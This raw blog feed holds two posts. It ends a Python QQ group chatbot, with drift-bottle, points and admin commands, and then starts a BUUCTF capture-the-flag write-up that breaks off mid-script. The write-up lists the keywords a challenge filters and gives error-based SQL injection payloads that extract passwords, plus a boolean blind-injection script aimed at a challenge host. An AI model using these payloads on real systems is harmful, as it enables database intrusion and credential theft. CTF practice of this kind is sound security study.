class="token string">'QFriend'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">\n总结：</span><span class="token interpolation"><span class="token punctuation">&#123;</span>ys<span class="token punctuation">[</span><span class="token string">'summary'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token keyword">def</span> <span class="token function">minusPoint</span><span class="token punctuation">(</span>gid<span class="token punctuation">,</span>uid<span class="token punctuation">,</span>point<span class="token punctuation">)</span><span class="token punctuation">:</span>    groupUserInfo<span class="token operator">=</span>group<span class="token punctuation">.</span>readGroupUserInfo<span class="token punctuation">(</span><span class="token punctuation">)</span>    thisGroupUserInfo<span class="token operator">=</span>groupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>gid<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        thisUser<span class="token operator">=</span>thisGroupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"[CQ:at,qq=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>uid<span class="token punctuation">&#125;</span></span><span class="token string">]请先签到后重试"</span></span>    <span class="token keyword">if</span> thisUser<span class="token punctuation">[</span><span class="token string">'point'</span><span class="token punctuation">]</span><span class="token operator">-</span>point <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"[CQ:at,qq=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>uid<span class="token punctuation">&#125;</span></span><span class="token string">]您的积分不足"</span></span>    thisUser<span class="token punctuation">[</span><span class="token string">'point'</span><span class="token punctuation">]</span><span class="token operator">-=</span>point    thisGroupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">=</span>thisUser    groupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>gid<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">=</span>thisGroupUserInfo    group<span class="token punctuation">.</span>saveGroupUserInfo<span class="token punctuation">(</span>groupUserInfo<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">"OK"</span><span class="token keyword">def</span> <span class="token function">throwBottle</span><span class="token punctuation">(</span>uid<span class="token punctuation">,</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        me<span class="token operator">=</span>message<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>        send<span class="token operator">=</span>me<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        rec<span class="token operator">=</span>me<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>        con<span class="token operator">=</span>me<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'bottle.json'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            bottle <span class="token operator">=</span> json<span class="token punctuation">.</span>load<span class="token punctuation">(</span>f<span class="token punctuation">)</span>        nb<span class="token operator">=</span><span class="token punctuation">&#123;</span>            <span class="token string">"QQ"</span><span class="token punctuation">:</span><span class="token builtin">str</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">"send"</span><span class="token punctuation">:</span>send<span class="token punctuation">,</span>            <span class="token string">"rec"</span><span class="token punctuation">:</span>rec<span class="token punctuation">,</span>            <span class="token string">"con"</span><span class="token punctuation">:</span>con        <span class="token punctuation">&#125;</span>        bottle<span class="token punctuation">.</span>append<span class="token punctuation">(</span>nb<span class="token punctuation">)</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'bottle.json'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            json<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>bottle<span class="token punctuation">,</span>f<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"biu～～～瓶子被扔走啦，坐等被人打捞吧～～～"</span></span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"扔瓶子失败了，请检查内容格式是否为：\n扔瓶子 发送者（可填匿名） 接受者（可填空） 内容"</span><span class="token keyword">def</span> <span class="token function">getBottle</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'myBottles.json'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        myBottles <span class="token operator">=</span> json<span class="token punctuation">.</span>load<span class="token punctuation">(</span>f<span class="token punctuation">)</span>          <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'bottle.json'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        bottle <span class="token operator">=</span> json<span class="token punctuation">.</span>load<span class="token punctuation">(</span>f<span class="token punctuation">)</span>    num<span class="token operator">=</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>bottle<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    nb<span class="token operator">=</span>bottle<span class="token punctuation">[</span>num<span class="token punctuation">]</span>    bottle<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>nb<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        myBottles<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>nb<span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        myBottles<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">[</span>nb<span class="token punctuation">]</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'bottle.json'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        json<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>bottle<span class="token punctuation">,</span>f<span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'myBottles.json'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        json<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>myBottles<span class="token punctuation">,</span>f<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>nb<span class="token punctuation">[</span><span class="token string">'send'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">扔给了</span><span class="token interpolation"><span class="token punctuation">&#123;</span>nb<span class="token punctuation">[</span><span class="token string">'rec'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">一个瓶子，内容是：</span><span class="token interpolation"><span class="token punctuation">&#123;</span>nb<span class="token punctuation">[</span><span class="token string">'con'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token keyword">def</span> <span class="token function">myBottles</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'myBottles.json'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        myBottles <span class="token operator">=</span> json<span class="token punctuation">.</span>load<span class="token punctuation">(</span>f<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        myBottles<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"您还没有瓶子呢，快去捞瓶子吧～～～"</span>    me<span class="token operator">=</span><span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> myBottles<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        me<span class="token operator">+=</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">[</span><span class="token string">'send'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">扔给了</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">[</span><span class="token string">'rec'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">一个瓶子，内容是：</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">[</span><span class="token string">'con'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span>    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"[CQ:at,qq=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>uid<span class="token punctuation">&#125;</span></span><span class="token string">]您的瓶子有：\n</span><span class="token interpolation"><span class="token punctuation">&#123;</span>me<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token keyword">def</span> <span class="token function">cleanBottles</span><span class="token punctuation">(</span>message<span class="token punctuation">,</span>uid<span class="token punctuation">)</span><span class="token punctuation">:</span>    num<span class="token operator">=</span>message<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'myBottles.json'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        myBottles <span class="token operator">=</span> json<span class="token punctuation">.</span>load<span class="token punctuation">(</span>f<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        myBottles<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"[CQ:at,qq=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>uid<span class="token punctuation">&#125;</span></span><span class="token string">]您还没有瓶子呢，快去捞瓶子吧～～～"</span></span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        nb<span class="token operator">=</span>myBottles<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'myBottles.json'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            json<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>myBottles<span class="token punctuation">,</span>f<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"[CQ:at,qq=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>uid<span class="token punctuation">&#125;</span></span><span class="token string">]您摔碎了</span><span class="token interpolation"><span class="token punctuation">&#123;</span>nb<span class="token punctuation">[</span><span class="token string">'send'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">扔给</span><span class="token interpolation"><span class="token punctuation">&#123;</span>nb<span class="token punctuation">[</span><span class="token string">'rec'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">一个瓶子，内容是：</span><span class="token interpolation"><span class="token punctuation">&#123;</span>nb<span class="token punctuation">[</span><span class="token string">'con'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"[CQ:at,qq=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>uid<span class="token punctuation">&#125;</span></span><span class="token string">]您还没有这个瓶子，快去捞一个吧"</span></span><span class="token keyword">def</span> <span class="token function">keywordForGroup</span><span class="token punctuation">(</span>message<span class="token punctuation">,</span> gid<span class="token punctuation">,</span> uid<span class="token punctuation">,</span>nick<span class="token punctuation">,</span>role<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> isBan<span class="token punctuation">(</span>gid<span class="token punctuation">,</span>uid<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">not</span> isAdmin<span class="token punctuation">(</span>gid<span class="token punctuation">,</span>uid<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span>    <span class="token keyword">if</span> message<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'天气'</span><span class="token punctuation">:</span>        group<span class="token punctuation">.</span>sendMessage<span class="token punctuation">(</span>weather<span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">,</span>gid<span class="token punctuation">)</span>    <span class="token keyword">elif</span> message<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'运势'</span><span class="token punctuation">:</span>        group<span class="token punctuation">.</span>sendMessage<span class="token punctuation">(</span>today<span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">,</span>gid<span class="token punctuation">)</span>    <span class="token keyword">elif</span> message<span class="token operator">==</span><span class="token string">"积分"</span><span class="token punctuation">:</span>        group<span class="token punctuation">.</span>sendMessage<span class="token punctuation">(</span>point<span class="token punctuation">(</span>gid<span class="token punctuation">,</span>uid<span class="token punctuation">)</span><span class="token punctuation">,</span>gid<span class="token punctuation">)</span>    <span class="token keyword">elif</span> message<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">"听他的话"</span> <span class="token keyword">and</span> uid<span class="token operator">==</span><span class="token number">405454586</span><span class="token punctuation">:</span>        group<span class="token punctuation">.</span>sendMessage<span class="token punctuation">(</span>giveAdmin<span class="token punctuation">(</span>gid<span class="token punctuation">,</span>getQQ<span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>gid<span class="token punctuation">)</span>    <span class="token keyword">elif</span> message<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'ban'</span> <span class="token keyword">and</span> isAdmin<span class="token punctuation">(</span>gid<span class="token punctuation">,</span>uid<span class="token punctuation">)</span><span class="token punctuation">:</span>        group<span class="token punctuation">.</span>sendMessage<span class="token punctuation">(</span>ban<span class="token punctuation">(</span>gid<span class="token punctuation">,</span>getQQ<span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>gid<span class="token punctuation">)</span>    <span class="token keyword">elif</span> message<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'unban'</span> <span class="token keyword">and</span> isAdmin<span class="token punctuation">(</span>gid<span class="token punctuation">,</span>uid<span class="token punctuation">)</span><span class="token punctuation">:</span>        group<span class="token punctuation">.</span>sendMessage<span class="token punctuation">(</span>unban<span class="token punctuation">(</span>gid<span class="token punctuation">,</span>getQQ<span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>gid<span class="token punctuation">)</span>    <span class="token keyword">elif</span> message<span class="token operator">==</span><span class="token string">'/help'</span><span class="token punctuation">:</span>        group<span class="token punctuation">.</span>sendMessage<span class="token punctuation">(</span><span class="token builtin">help</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>gid<span class="token punctuation">)</span>    <span class="token keyword">elif</span> message<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'双色球'</span><span class="token punctuation">:</span>        group<span class="token punctuation">.</span>sendMessage<span class="token punctuation">(</span>theDoubleChromosphere<span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">,</span>gid<span class="token punctuation">)</span>    <span class="token keyword">elif</span> message<span class="token operator">==</span><span class="token string">"签到"</span><span class="token punctuation">:</span>        group<span class="token punctuation">.</span>sendMessage<span class="token punctuation">(</span>sign<span class="token punctuation">(</span>gid<span class="token punctuation">,</span>uid<span class="token punctuation">,</span>nick<span class="token punctuation">)</span><span class="token punctuation">,</span>gid<span class="token punctuation">)</span>    <span class="token keyword">elif</span> message<span class="token operator">==</span><span class="token string">"捞瓶子"</span><span class="token punctuation">:</span>        group<span class="token punctuation">.</span>sendMessage<span class="token punctuation">(</span>getBottle<span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">,</span>gid<span class="token punctuation">)</span>    <span class="token keyword">elif</span> message<span class="token operator">==</span><span class="token string">"我的瓶子"</span><span class="token punctuation">:</span>        group<span class="token punctuation">.</span>sendMessage<span class="token punctuation">(</span>myBottles<span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">,</span>gid<span class="token punctuation">)</span>    <span class="token keyword">elif</span> message<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">"摔瓶子"</span><span class="token punctuation">:</span>        group<span class="token punctuation">.</span>sendMessage<span class="token punctuation">(</span>cleanBottles<span class="token punctuation">(</span>message<span class="token punctuation">,</span>uid<span class="token punctuation">)</span><span class="token punctuation">,</span>gid<span class="token punctuation">)</span>    <span class="token keyword">elif</span> message<span class="token operator">==</span><span class="token string">"无内鬼"</span><span class="token punctuation">:</span>        group<span class="token punctuation">.</span>sendMessage<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[CQ:at,qq=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>uid<span class="token punctuation">&#125;</span></span><span class="token string">]穿件衣服吧你！你自己不恶sin吗？"</span></span><span class="token punctuation">,</span>gid<span class="token punctuation">)</span>    <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r"[\(\)（）]"</span><span class="token punctuation">,</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>        group<span class="token punctuation">.</span>sendMessage<span class="token punctuation">(</span>buquan<span class="token punctuation">(</span>message<span class="token punctuation">,</span>uid<span class="token punctuation">)</span><span class="token punctuation">,</span>gid<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">keywordForPerson</span><span class="token punctuation">(</span>message<span class="token punctuation">,</span>uid<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> message<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">"扔瓶子"</span><span class="token punctuation">:</span>        person<span class="token punctuation">.</span>sendMessage<span class="token punctuation">(</span>throwBottle<span class="token punctuation">(</span>uid<span class="token punctuation">,</span>message<span class="token punctuation">)</span><span class="token punctuation">,</span>uid<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#group.py</span><span class="token keyword">import</span> json<span class="token keyword">import</span> requests<span class="token comment">#保存用户信息</span><span class="token keyword">def</span> <span class="token function">saveGroupUserInfo</span><span class="token punctuation">(</span>userInfo<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'userInfoOfGroup.json'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        json<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>userInfo<span class="token punctuation">,</span>f<span class="token punctuation">)</span><span class="token comment">#读取用户信息</span><span class="token keyword">def</span> <span class="token function">readGroupUserInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'userInfoOfGroup.json'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        userInfo <span class="token operator">=</span> json<span class="token punctuation">.</span>load<span class="token punctuation">(</span>f<span class="token punctuation">)</span>    <span class="token keyword">return</span> userInfo<span class="token comment">#发送信息</span><span class="token keyword">def</span> <span class="token function">sendMessage</span><span class="token punctuation">(</span>message<span class="token punctuation">,</span>gid<span class="token punctuation">)</span><span class="token punctuation">:</span>    url<span class="token operator">=</span><span class="token string">"http://127.0.0.1:5700/send_msg?group_id="</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>gid<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"&amp;message="</span><span class="token operator">+</span>message    requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF记录1</title>
      <link href="/posts/42117.html"/>
      <url>/posts/42117.html</url>
      
        <content type="html"><![CDATA[<p>BUU第一份</p><span id="more"></span>        <h2 id="极客大挑战-2019-HardSQL"   >          <a href="#极客大挑战-2019-HardSQL" class="heading-link"><i class="fas fa-link"></i></a><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2>      <p>首先尝试输入点东西</p><p>结果![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-13" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-13</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 22.14.07.png)</p><p>尝试万能密码![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-13" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-13</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 22.14.34.png)</p><p>跑一下看看都过滤了啥</p><pre class="line-numbers language-none"><code class="language-none">该字符是非法字符: union该字符是非法字符: and该字符是非法字符: sleep该字符是非法字符: by该字符是非法字符: if该字符是非法字符: char该字符是非法字符: ascii该字符是非法字符: mid该字符是非法字符: substring该字符是非法字符: handler该字符是非法字符: benchmark该字符是非法字符: insert该字符是非法字符: *该字符是非法字符: &#x3D;该字符是非法字符: \该字符是非法字符: 空格<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只能尝试报错注入了</p><pre class="line-numbers language-none"><code class="language-none">1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),15)),0x7e),1))#1&#39;or(updatexml(1,concat(0x7e,(right((select(group_concat(password))from(H4rDsq1)),15)),0x7e),1))#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>报错注入限制长度，用right函数切割</p>        <h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"   >          <a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="heading-link"><i class="fas fa-link"></i></a><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2>      <p>布尔盲注</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://40a6cf54-8382-490a-8651-8324677bb273.node4.buuoj.cn:81/index.php"</span>flagchar<span class="token operator">=</span><span class="token string">"flag&#123;-abcdef1234567890&#125;"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> flagchar<span class="token punctuation">:</span>        data<span class="token operator">=</span><span class="token punctuation">&#123;</span>            <span class="token string">'id'</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f"if(ascii(substr((select(flag)from(flag)),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">,2,1)"</span></span>        <span class="token punctuation">&#125;</span>        tex<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token 